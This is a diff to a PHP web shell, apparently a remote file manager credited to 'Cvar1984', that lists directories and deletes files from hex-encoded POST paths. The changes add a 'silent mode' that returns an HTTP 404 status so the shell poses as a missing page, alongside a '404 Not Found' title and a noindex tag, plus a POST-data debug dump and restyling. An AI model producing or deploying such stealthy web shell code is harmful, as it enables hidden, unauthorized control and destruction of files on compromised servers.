@@ -19,6 +19,10 @@
               You should have received a copy of the GNU General Public License
               along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
+
+define('R4_DEBUG', true); // show post data
+define('R4_SILENT_MODE', true); // 404 response code
+
 function getDirectoryContents($dir)
 {
     $dirs = scandir($dir);
@@ -240,6 +244,12 @@ function deleteAll($filename)
         return @unlink($filename);
     }
 }
+if (R4_SILENT_MODE) {
+    header('HTTP/1.1 404 Not Found');
+}
+if (R4_DEBUG) {
+    print_r($_POST);
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -252,18 +262,25 @@ function deleteAll($filename)
     <title>404 Not Found</title>
     <meta name="author" content="Cvar1984">
     <meta name="robots" content="noindex, nofollow">
-
+    <link rel="icon" type="image/x-icon" href="https://i.postimg.cc/cCdR8xkF/dna.png">
     <!-- Mobile Specific Metas
   –––––––––––––––––––––––––––––––––––––––––––––––––– -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
     <!-- CSS
   –––––––––––––––––––––––––––––––––––––––––––––––––– -->
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/dhg/Skeleton/gh-pages/dist/css/normalize.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css" integrity="sha512-EZLkOqwILORob+p0BXZc+Vm3RgJBOe1Iq/0fiI7r/wJgzOFZMlsqTa29UEl6v6U6gsV4uIpsNZoV32YZqrCRCQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap');
+
+        :root {
+            --text-color: white;
+            --background-color: black;
+            --font-style: 'Ubuntu Mono';
+        }
+
         a {
-            color: black;
+            color: var(--text-color);
         }
 
         a:link {
@@ -307,6 +324,19 @@ function deleteAll($filename)
         td.files {
             cursor: pointer;
         }
+
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            font-family: var(--font-style), monospace;
+            height: 100%;
+            /* Center and scale the image nicely */
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-image: linear-gradient(rgba(0, 0, 0, 0.5),rgba(0, 0, 0, 0.5)),
+            url('https://i.postimg.cc/Z549LsJM/x.gif');
+        }
     </style>
 </head>
 
@@ -348,7 +378,7 @@ function deleteAll($filename)
                 }
                 break;
             case 'rm':
-                if(!deleteAll(hex2bin($_POST['path']))) {
+                if (!deleteAll(hex2bin($_POST['path']))) {
                     echo "failed";
                 }
                 break;
@@ -481,7 +511,6 @@ function deleteAll($filename)
             } ?>
         </tbody>
     </table>
-    <?php print_r($_POST); ?>
     <form id="action_container" method="POST">
         <input type="hidden" id="path" name="path" />
         <input type="hidden" id="actions" name="actions" />
